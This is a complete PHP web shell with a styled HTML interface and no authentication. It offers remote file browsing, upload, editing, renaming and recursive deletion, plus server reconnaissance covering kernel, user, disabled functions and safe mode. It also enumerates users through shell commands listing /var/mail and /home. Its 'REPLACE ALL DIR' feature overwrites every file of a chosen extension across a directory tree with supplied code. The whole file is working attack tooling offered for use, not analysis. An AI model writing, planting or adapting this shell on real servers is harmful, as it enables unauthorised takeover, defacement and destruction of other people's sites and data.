<title><?= get_current_user() ?></title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style type="text/css">
    @import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
    body {
        background: #171717;
        color: #d4d4d4;
        font-family: 'Pangolin', cursive;
    }
    a {
        font-family: 'Pangolin', cursive;
        text-decoration: none;
        color: #d4d4d4;
    }
    table {
        border-radius:10px;
        padding: 20px;
        width:70%;
        background: #242424;
    }
    textarea {
        width:100%;
        font-family: 'Pangolin', cursive;
        height:350px;
        border-radius:4px;
        color: #d4d4d4;
        resize: none;
        outline: none;
        padding:15px;
        border:2px solid #d4d4d4;
        background: transparent;
    }
    ::-webkit-scrollbar {
        width: 0px;
        background: transparent;
    }
    ::-webkit-scrollbar-thumb {
        width: 0px;
        background: transparent;
    }
    select.select {
        background: #242424;
        padding:0;
    }
    select {
        outline: none;
        background: #242424;
        padding:5px;
        border-radius:3px;
        width:100%;
        font-family: 'Pangolin', cursive;
        border:2px solid #d4d4d4;
        color: #d4d4d4;
        resize: none;
    }
    input[type=text],
    input[type=submit] {
        padding:5px;
        font-family: 'Pangolin', cursive;
        border-radius:4px;
        background: none;
        border:2px solid #d4d4d4;
        color: #d4d4d4;
        outline: none;
        width:100%;
    }
    td {
        padding:3px;
    }
    td.files {
        max-width:70%;
    }
    td.form {
        width:10px;
        text-align: center;
    }
    td.action {
        width:100px;
    }
    td.tt {
        width:1px;
    }
    td.header {
        padding:5px;
        text-align: center;
        font-size:25px;
        font-weight: bold;
    }
    button {
        font-family: 'Pangolin', cursive;
        font-weight: bold;
        outline: none;
        color: #d4d4d4;
        font-size: 17px;
        padding:0px;
        background:none;
        padding:0px 5px;
        border:none;
    }
    button:hover {
        cursor: pointer;
    }
    td.select {
        width:70px;
    }
    .icons {
        width:25px;
        height:25px;
    }
    .container {
        display: block;
        position: relative;
        padding-left: 15px;
        margin-bottom: 19px;
        cursor: pointer;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
    }

    .container input {
        position: absolute;
        opacity: 0;
        cursor: pointer;
        height: 0;
        width: 0;
    }

    .checkmark {
        position: absolute;
        top: 0;
        left: 0;
        height: 18px;
        width: 18px;
        border-radius:10px;
        background-color: #d4d4d4;
    }
    .container:hover input ~ .checkmark {
        background-color: #ccc;
    }
    .container input:checked ~ .checkmark {
        background-color: #2196F3;
    }
    .checkmark:after {
        content: "";
        position: absolute;
        display: none;
    }
    .container input:checked ~ .checkmark:after {
        display: block;
    }
    .container .checkmark:after {
        left: 6px;
        top: 2px;
        width: 3px;
        height: 8px;
        border: solid white;
        border-width: 0 3px 3px 0;
        -webkit-transform: rotate(45deg);
        -ms-transform: rotate(45deg);
        transform: rotate(45deg);
    }
    #modalContainer {
        background-color:rgba(0, 0, 0, 0.3);
        position:absolute;
        width:100%;
        height:100%;
        top:0px;
        left:0px;
        z-index:10000;
    }

    #alertBox {
        position:relative;
        width:300px;
        min-height:165px;
        padding:10px;
        border-radius:10px;
        margin-top:50px;
        background: #242424;
        background-repeat:no-repeat;
        background-position:20px 30px;
    }

    #modalContainer > #alertBox {
        position:fixed;
    }

    #alertBox h1 {
        margin:0;
        font-family: 'Pangolin', cursive;
        color: #d4d4d4;
        border-bottom: 2px solid rgba(222,222,222,0.73);
        border-radius: 10px 10px 00px 0px;
        padding:10px 0 10px 15px;
    }

    #alertBox p {
        font-family: 'Pangolin', cursive;
        height:50px;
        color: #d4d4d4;
        margin-left:16px;
    }

    #alertBox #closeBtn {
        display:block;
        position:relative;
        margin:5px auto;
        outline:none;
        color: #d4d4d4;
        padding:7px 100px;
        border-radius:7px;
        width:70px;
        border:2px solid #d4d4d4;
        font-family: 'Pangolin', cursive;
        text-transform:uppercase;
        text-align:center;
        color: #8a8a8a;
        background: #242424;
        text-decoration:none;
    }
    .topnav {
        overflow: hidden;
    }
    .topnav a {
        text-align: center;
        color: #f2f2f2;
        text-align: center;
        padding: 3px 3px;
        text-decoration: none;
        font-size: 17px;
    }
    .topnav .icon {
        display: none;
    }
    div.alert {
        background: #508f45;
        padding:5px;
        border-radius:3px;
    }
    span.value {
        font-size:22px;
        padding:15px;
    }
    @media (min-width: 320px) and (max-width: 480px) {
        body {
            font-size:5px;
            background: #242424;

        }
        td.size {
            display: none;
        }
        table {
            width:100%;
            border:none;
            padding:0px;
        }
        td.select {
            width:20px;
        }
        .topnav a:not(:first-child) {display: none;}
        .topnav a.icon {
        float: right;
        margin-top:3px;
        display: block;
        }
    }
    @media (min-width: 320px) and (max-width: 480px) {
        .topnav.responsive {
            position: relative;
        }
        .topnav.responsive .icon {
            position: absolute;
            right: 0;
            top: 0;
        }
        .topnav.responsive a {
            float: none;
            display: block;
            text-align: left;
        }
    }
</style>
<script type='text/javascript'>
    var alert_TITLE = "ALERT";
    var alert_BUTTON_TEXT = "Ok";

    if(document.getElementById) {
        window.alert = function(txt) {
            createCustomalert(txt);
        }
    }
    function createCustomalert(txt) {
        d = document;
        if(d.getElementById("modalContainer")) return;
        mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
        mObj.id = "modalContainer";
        mObj.style.height = d.documentElement.scrollHeight + "px";
        alertObj = mObj.appendChild(d.createElement("div"));
        alertObj.id = "alertBox";
        if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
        alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
        alertObj.style.visiblity="visible";
        h1 = alertObj.appendChild(d.createElement("h1"));
        h1.appendChild(d.createTextNode(alert_TITLE));
        msg = alertObj.appendChild(d.createElement("p"));
        msg.innerHTML = txt;
        btn = alertObj.appendChild(d.createElement("a"));
        btn.id = "closeBtn";
        btn.appendChild(d.createTextNode(alert_BUTTON_TEXT));
        btn.href = "#";
        btn.focus();
        btn.onclick = function() { removeCustomalert();return false; }
        alertObj.style.display = "block";
    }
    function removeCustomalert() {
        document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
    }
    function myFunction() {
        var x = document.getElementById("myTopnav");
        if (x.className === "topnav") {
            x.className += " responsive";
        } else {
            x.className = "topnav";
        }
    }
    function checkAll(ele) {
        var checkboxes = document.getElementsByTagName('input');
        if (ele.checked) {
            for (var i = 0; i < checkboxes.length; i++) {
                if (checkboxes[i].type == 'checkbox' ) {
                    checkboxes[i].checked = true;
                }
            }
        } else {
            for (var i = 0; i < checkboxes.length; i++) {
                if (checkboxes[i].type == 'checkbox') {
                    checkboxes[i].checked = false;
                }
            }
        }
    }
</script>

<table align="center">
<?php
class x {
    var $name;
    var $kernel;
    var $software;
    var $version;
    var $disable_functions;
    public function __construct(bool $debug = true, int $time = 0) {
        if ($debug === true) {
            error_reporting(E_ALL);
        } else {
            error_reporting($debug);
        }

        error_log($debug);
        set_time_limit($time);
        $this->root = $_SERVER['DOCUMENT_ROOT'];
        $this->cwd  = $this->cwd() . DIRECTORY_SEPARATOR;
        $this->cft  = time();
    }
    public function redirect($x) {
        return "<script>window.location='{$x}'</script>";
    }
    public function home() {
        $this->home = "http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
        if ($this->vars($this->home)) {
            return false;
        } else {
            return false;
        }
    }
    public function vars($x) {
        return print($x);
    }
    public function cwd() {
        return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
    }
    public function cd(string $directory) {
        if (isset($directory)) {
            $this->dir = $directory;
            @chdir($this->dir);
        } else {
            $this->dir = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
        } return $this->dir;
    }
    public function changeTime($filename) {
        if (file_exists($filename)) $this->cft = filemtime($filename);
    }
    public function perms($filename) {
        return substr(sprintf("%o", fileperms($filename)), -4);
    }
    public function w__($filename, $perms) {
        if (is_writable($filename)) {
            return "<font color='lime'>{$perms}</font>";
        } else {
            return "<font color='red'>{$perms}</font>";
        }
    }
    public function geticon() {
        foreach (scandir(getcwd()) as $key => $value) {
            $this->extension = strtolower(pathinfo($value, PATHINFO_EXTENSION));
            switch ($this->extension) {
                case 'ico':
                    return $this->vars($_SERVER['HTTP_HOST'] . str_replace($this->root, '', $this->cwd() . $value));
                break;
            
            default:
                    return $this->vars("https://image.flaticon.com/icons/svg/833/833524.svg");
                break;
            }
        }
    }
    public function getimg($filename) {
        $this->extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        switch ($this->extension) {
            case 'php':
                $this->vars("https://image.flaticon.com/icons/png/128/337/337947.png");
                break;
            
            default:
                $this->vars("https://image.flaticon.com/icons/svg/833/833524.svg");
                break;
        }
    }
    public function usergrup() {
        if (!file_exists('posix_getegid')) {
            $user['name']   = @get_current_user();
            $user['uid']    = @getmyuid();
            $user['gid']    = @getmygid();
            $user['group']  = "?";
        } else {
            $user['uid']    = @posix_getpwuid(posix_geteuid());
            $user['gid']    = @posix_getgrgid(posix_getegid());
            $user['name']   = $user['uid']['name'];
            $user['uid']    = $user['uid']['uid'];
            $user['group']  = $user['gid']['name'];
            $user['gid']    = $user['gid']['gid'];
        } return (object) $user;
    }
    public function upload(array $file) {
        $this->files = count($file['tmp_name']);
        for ($i=0; $i < $this->files ; $i++) { 
            return copy($file['tmp_name'][$i], $this->cd('') . $file['name'][$i]);
        }
    }
    public function changename($filename, $newname) {
        return rename($filename, $this->cd('') . htmlspecialchars($newname));
    }
    public function delete($filename) {
        if (is_dir($filename)) {
            $this->scdir = scandir($filename);
            foreach ($this->scdir as $key => $value) {
                if ($value != '.' && $value != '..') {
                    if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
                        $this->delete($filename . DIRECTORY_SEPARATOR . $value);
                    } else {
                        unlink($filename . DIRECTORY_SEPARATOR . $value);
                    }
                }
            } if (rmdir($filename)) {
                return true;
            } else {
                return false;
            }
        } else {
            if (unlink($filename)) {
                return true;
            } else {
                return false;
            }
        }
    }
    public function listfile($dir, &$output = array()) {
        foreach (scandir($dir) as $key => $value) {
            $this->locate = $dir . DIRECTORY_SEPARATOR . $value;
            if (!is_dir($this->locate)) {
                $output[] = $this->locate;
            } elseif ($value != '.' && $value != '..') {
                $this->listfile($this->locate, $output);
            }
        } return $output;
    } public function replace($dir, $extension, $text) {
        if (is_writable($dir)) {
            foreach ($this->listfile($dir) as $key => $value) {
                $this->ext = strtolower(pathinfo($value, PATHINFO_EXTENSION));
                switch ($this->ext) {
                    case $extension:
                        if (preg_match('/' . basename($value) ."$/i", $_SERVER['PHP_SELF'], $matches) == 0) {
                            if (file_put_contents($value, $text)) { ?>
                                <tr>
                                    <td>
                                        <div class="alert">
                                            <?= $value ?>
                                        </div>
                                    </td>
                                </tr>
                            <?php }
                        }
                        break;
                }
            }
        }
    }
    public function getuser($file) {
        $this->user = file($file);
        foreach ($this->user as $key => $value) {
            $this->str = explode(":", $value);
            print($this->str[0]."\n");
        }
        print(system("ls /var/mail"));
        print(system("ls /home"));
    }
    public function makefile($filename, $text, $name = null) {
        if ($name === 'file') {
            $this->handle = fopen($filename, "w");
            fwrite($this->handle, $text);
            fclose($this->handle);
        } elseif ($name === 'dir') {
            return (!mkdir($filename, 0777) && !is_dir($filename));
        }
    }
    public function size($filename) {
        if (is_file($filename)) {
            $this->filepath = $filename;
            if (!realpath($this->filepath)) {
                $this->filepath = $this->root . $this->filepath;
            }
            $this->filesize = filesize($this->filepath);
            $this->size     = array("TB","GB","MB","KB","B");
            $this->total    = count($this->size);
            while ($this->total-- && $this->filesize > 1024) {
                $this->filesize /= 1024;
            } return round($this->filesize, 2) . " " . $this->size[$this->total];
        } return false;
    }
    public function ftime($filename) {
        return date("F d Y g:i:s", filemtime($filename));
    }
    public function save($filename, $text, $mode = "w") {
        if (substr($this->cwd, -1) === DIRECTORY_SEPARATOR) {
            $this->changeTime($this->cwd . $filename);
            $this->handle = fopen($filename, $mode);
            fwrite($this->handle, $text);
            fclose($this->handle);
        } else {
            $this->changeTime($this->cwd . DIRECTORY_SEPARATOR . $filename);
            $this->handle = fopen($filename, $mode);
            fwrite($this->handle, $text);
            fclose($this->handle);
        }
    }
}

$x = new x();
$x->kernel      = php_uname();
$x->software    = $_SERVER['SERVER_SOFTWARE'];
$x->server      = $_SERVER['SERVER_NAME'];
$x->version     = phpversion();
$x->disable     = ini_get('disable_functions');
$x->disable     = (!empty($x->disable)) ? "<font color='red'>{$x->disable}</font>" : "<font color='lime'>NONE</font>";
$user           = $x->usergrup();

if (isset($_GET['cd'])) {
    $x->cd($_GET['cd']);
}

switch (@$_POST['tools']) {
    case 'replace':
        ?>
        <tr>
            <td class="header">
                <a style="float: left;" href="?cd=<?= getcwd() ?>">
                    <img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icons">
                </a>
                REPLACE ALL DIR
            </td>
        </tr>
        <form method="post">
            <tr>
                <td>
                    <input type="text" name="dir" value="<?= getcwd() ?>">
                </td>
            </tr>
            <tr>
                <td>
                    <input type="text" name="ext[]" placeholder="ext: php html txt">
                </td>
            </tr>
            <tr>
                <td>
                    <textarea name="text" placeholder="your code"><?= htmlspecialchars(@$_POST['text']) ?></textarea>
                </td>
            </tr>
            <tr>
                <td>
                    <input type="submit" name="submit" value="REPLACE">
                    <input type="hidden" name="tools" value="replace">
                </td>
            </tr>
        </form>
        <?php
        if (isset($_POST['submit'])) {
            for ($i=0; $i < count($_POST['ext']) ; $i++) { 
                $plod =explode(' ', $_POST['ext'][$i]);
                foreach ($plod as $key => $value) {
                    if ($value) { ?>
                        <tr>
                            <td>
                                <center>
                                    <span class="value"><b><?= $value ?></b></span>
                                </center>
                            </td>
                        </tr>
                    <?php
                    $x->replace($_POST['dir'], $value, $_POST['text']);
                    }
                }
            }
        }
        exit();
        break;
    case 'making':
        if (isset($_POST['submit'])) {
            switch ($_POST['type']) {
                case 'file':
                    if ($x->makefile($_POST['filename'], $_POST['text'], 'file')) {
                        ?> <script>alert("failed")</script> <?php
                    } else {
                        ?> <script>alert("created file <u><?= $_POST['filename'] ?></u>")</script> <?php
                    }
                    break;
                case 'dir':
                    if ($x->makefile($_POST['filename'], '', 'dir')) {
                        ?> <script>alert("failed")</script> <?php
                    } else {
                        ?> <script>alert("created dir <u><?= $_POST['filename'] ?></u>")</script> <?php
                    }
                    break;
            }
        }
        ?>
        <tr>
            <td class="header">
                <a style="float: left;" href="?cd=<?= getcwd() ?>">
                    <img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icons">
                </a>
                CREATE FILE & DIRECTORY
            </td>
        </tr>
        <form method="post">
            <tr>
                <td>
                    <center>
                        <input type="radio" name="type" value="file"> FILE 
                        <input type="radio" name="type" value="dir"> DIR
                    </center>
                </td>
            </tr>
            <tr>
                <td>
                    <input type="text" name="filename" placeholder="file/dir">
                </td>
            </tr>
            <tr>
                <td>
                    <textarea name="text" placeholder="if you choose dir please clear this"></textarea>
                </td>
            </tr>
            <tr>
                <td>
                    <input type="submit" name="submit">
                    <input type="hidden" name="tools" value="making">
                </td>
            </tr>
         </form>
        <?php
        exit();
        break;
    case 'upload':
        if (isset($_POST['submit'])) {
            if ($x->upload($_FILES['file'])) {
                ?> <script>alert("Uploaded")</script> <?php
            } else {
                ?> <script>alert("failed")</script> <?php
            }
        }
        ?>
        <tr>
            <td class="header">
                <a style="float: left;" href="?cd=<?= getcwd() ?>">
                    <img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icons">
                </a>
                UPLOAD FILE
            </td>
        </tr>
        <form method="post" enctype="multipart/form-data">
            <tr>
                <td>
                    <input type="file" name="file[]" multiple>
                </td>
                <td>
                    <input type="submit" name="submit">
                    <input type="hidden" name="tools" value="upload">
                </td>
            </tr>
        </form>
        <?php
        exit();
        break;
    
    case 'info':
        ?>
        <tr>
            <td class="header" colspan="3">
                <a style="float: left;" href="?cd=<?= getcwd() ?>">
                    <img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icons">
                </a>
                SERVER INFO
            </td>
        </tr>
        <tr>
            <td>
                Kernel
            </td>
            <td class="tt"><center>:</center></td>
            <td>
                <?= $x->kernel ?>
            </td>
        </tr>
        <tr>
            <td>
                Software
            </td>
            <td class="tt"><center>:</center></td>
            <td>
                <?= $x->software ?>
            </td>
        </tr>
        <tr>
            <td>
                Server
            </td>
            <td class="tt"><center>:</center></td>
            <td>
                <a href="http://<?= $x->server ?>" target="_blank"><?= $x->server ?></a>
            </td>
        </tr>
        <tr>
            <td>
                User / Group
            </td>
            <td class="tt">:</td>
            <td>
                <?= $user->name ?> | 
                <?= $user->uid ?> | 
                <?= $user->group ?> | 
                <?= $user->gid ?>
            </td>
        </tr>
        <tr>
            <td>
                PHP version
            </td>
            <td class="tt">:</td>
            <td>
                <?= $x->version ?>
            </td>
        </tr>
        <tr>
            <td>
                Safe Mode
            </td>
            <td class="tt">:</td>
            <td>
                <?= (ini_get(strtoupper("safe_mode")) === "ON" ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font") ?>
            </td>
        </tr>
        <tr>
            <td>
                Disable Function
            </td>
            <td class="tt">:</td>
            <td>
                <?= $x->disable ?>
            </td>
        </tr>
        <?php
        exit();
        break;
}

switch (@$_POST['act']) {
    case 'edit':
        if (isset($_POST['submit'])) {
            if ($x->save($_POST['file'], $_POST['text'])) {
                ?> <script>alert("Update failed")</script> <?php
            } else {
                ?> <script>alert("<?= basename($_POST['file']) ?> Updated")</script> <?php
            }
        }
        ?>
        <tr>
            <td colspan="3" class="header">
                <a style="float: left;" href="?cd=<?= getcwd() ?>">
                    <img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icons">
                </a>
                EDIT
            </td>
        </tr>
        <tr>
            <td>
                Directory
            </td>
            <td class="tt"><center>:</center></td>
            <td>
                <?= getcwd() ?>
            </td>
        </tr>
        <tr>
            <td class="action">
                Filename
            </td>
            <td class="tt"><center>:</center></td>
            <td>
                <?= $x->w__($_POST['file'], basename($_POST['file'])) ?>
            </td>
        </tr>
        <tr>
            <td class="action">
                Size
            </td>
            <td class="tt"><center>:</center></td>
            <td>
                <?= $x->size($_POST['file']) ?>
            </td>
        </tr>
        <tr>
            <td class="action">
                Last update
            </td>
            <td class="tt"><center>:</center></td>
            <td>
                <?= $x->ftime($_POST['file']) ?>
            </td>
        </tr>
        <tr>
            <form method="post">
            <td colspan="3">
                <select name="act" onchange="if(this.value != '0') this.form.submit()" >
                    <option value="edit" selected>EDIT</option>
                    <option value="delete">DELETE</option>
                    <option value="changename">CHANGENAME</option>
                </select>
                <input type="hidden" name="file" value="<?=$_POST['file']?>">
            </td>
            </form>
        </tr>
        <form method="post">
            <tr>
                <td colspan="3">
                    <textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
                </td>
            </tr>
            <tr>
                <td colspan="3">
                    <input type="submit" name="submit">
                    <input type="hidden" name="act" value="edit">
                    <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
                </td>
            </tr>
        </form>
        <?php
        exit();
        break;
    case 'changename':
        if (isset($_POST['submit'])) {
            if ($x->changename($_POST['file'], htmlspecialchars($_POST['newname']))) {
                echo ' <meta http-equiv="refresh" content="0;url=?cd='.getcwd().'">';
            } else {
                ?> <script>alert("failed")</script> <?php
            }
        }
        ?>
        <tr>
            <td class="header" colspan="3">
                <a style="float: left;" href="?cd=<?= getcwd() ?>">
                    <img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icons">
                </a>
                CHANGE NAME
            </td>
        </tr>
        <tr>
            <td>
                Directory
            </td>
            <td class="tt"><center>:</center></td>
            <td>
                <?= $x->cd($_GET['cd']) ?>
            </td>
        </tr>
        <tr>
            <td class="action">
                Filename
            </td>
            <td class="tt"><center>:</center></td>
            <td>
                <?= $x->w__($_POST['file'], basename($_POST['file'])) ?>
            </td>
        </tr>
        <tr>
            <td class="action">
                Size
            </td>
            <td class="tt"><center>:</center></td>
            <td>
                <?= $x->size($_POST['file']) ?>
            </td>
        </tr>
        <tr>
            <td class="action">
                Last update
            </td>
            <td class="tt"><center>:</center></td>
            <td>
                <?= $x->ftime($_POST['file']) ?>
            </td>
        </tr>
        <tr>
            <form method="post">
            <td colspan="3">
                <select name="act" onchange="if(this.value != '0') this.form.submit()" >
                    <option value="edit">EDIT</option>
                    <option value="delete">DELETE</option>
                    <option value="changename" selected>CHANGENAME</option>
                </select>
                <input type="hidden" name="file" value="<?=$_POST['file']?>">
            </td>
            </form>
        </tr>
        <form method="post">
            <tr>
                <td colspan="3">
                    <input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
                </td>
            </tr>
            <tr>
                <td colspan="3">
                    <input type="submit" name="submit">
                    <input type="hidden" name="act" value="changename">
                    <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
                </td>
            </tr>
        </form>
        <?php
        exit();
        break;
    case 'delete':
        $x->delete($_POST['file']);
        break;
}

foreach (scandir(getcwd()) as $key => $value) {
    if (!is_dir($value) || $value === '.') continue;
        if ($value === '..') {
            ?>
            <tr>
                <form method="post" action="?cd=<?= getcwd() ?>">
                    <td colspan="6" class="header">
                        <div class="topnav" id="myTopnav">
                            <a style="float: left;" href="?cd=<?= dirname(getcwd()) ?>">
                                <img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icons">
                            </a>
                            <a href="<?= $x->home() ?>">HOME</a>
                            <a>
                                <button name="tools" value="info">SERVER INFO</button>
                            </a>
                            <a>
                                <button>CONFIG</button>
                            </a>
                            <a>
                                <button name="tools" value="upload">UPLOAD</button>
                            </a>
                            <a>
                                <button name="tools" value="making">CREATE FILE</button>
                            </a>
                            <a>
                                <button name="tools" value="replace">REPLACE</button>
                            </a>
                            <a>
                                <button>LOGOUT</button>
                            </a>
                            <a href="javascript:void(0);" class="icon" onclick="myFunction()">
                                <i class="fa fa-bars"></i>
                            </a>
                        </div>
                    </td>
                </form>
            </tr>
            <?php
        } else {
            ?>
            <tr>
                <td class="form">
                    <label class='container'>
                        <input type="checkbox" name="value[]" form="myform" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
                        <span class='checkmark'></span>
                    </label>
                </td>
                <td class="form">
                    <img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icons">
                </td>
                <td class="files">
                    <a href="?cd=<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>"><?= $value ?></a>
                </td>
                <td class="size">
                    <center>
                        <?= @filetype($value) ?>
                    </center>
                </td>
                <td>
                    <center>
                        <?= $x->w__($value, $x->perms($value)) ?>
                    </center>
                </td>
                <form method="post" action="?cd=<?= getcwd() ?>">
                    <td class="select">
                        <select class="select" name="act" onchange="if(this.value != '0') this.form.submit()">
                            <option selected>ACTION</option>
                            <option value="delete">DELETE</option>
                            <option value="changename">CHANGENAME</option>
                        </select>
                        <input type="hidden" name="file" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
                    </td>
                </form>
            </tr>
            <?php
        }
}
foreach (scandir(getcwd()) as $key => $value) {
    if (!is_file($value)) continue;
        ?>
        <tr>
            <td class="form">
                <label class='container'>
                    <input type="checkbox" name="value[]" form="myform" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
                    <span class='checkmark'></span>
                </label>
            </td>
            <td class="form">
                <img class="icons" src="<?= $x->getimg($value) ?>">
            </td>
            <td class="files">
                <a href="http://<?= $x->server.str_replace($_SERVER['DOCUMENT_ROOT'], '', getcwd().DIRECTORY_SEPARATOR.$value) ?>" target="_blank">
                    <?= $value ?>
                </a>
            </td>
            <td class="size">
                <center>
                    <?= $x->size($value) ?>
                </center>
            </td>
            <td>
                <center>
                    <?= $x->w__($value, $x->perms($value)) ?>
                </center>
            </td>
            <form method="post" action="?cd=<?= getcwd() ?>">
                <td class="select">
                    <select class="select" name="act" onchange="if(this.value != '0') this.form.submit()">
                        <option selected>ACTION</option>
                        <option value="edit">EDIT</option>
                        <option value="delete">DELETE</option>
                        <option value="changename">CHANGENAME</option>
                    </select>
                    <input type="hidden" name="file" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
                </td>
            </form>
        </tr>
        <?php
}
?>
<tr>
    <td class="form">
        <label class='container'>
            <input onclick="checkAll(this)" type="checkbox">
            <span class='checkmark'></span>
        </label>
    </td>
    <form method="post" id="myform">
        <td colspan="5">
            <select name="mode" onchange="if(this.value != '0') this.form.submit()">
                <option selected>ACTION</option>
                <option value="delete">DELETE</option>
            </select>
        </td>
    </form>
</tr>
<?php
if (!empty($data = @$_POST['value'])) {
    foreach ($data as $key => $value) {
        switch (@$_POST['mode']) {
            case 'delete':
                print($value);
                break;
        }
    }
}
?>
</table>
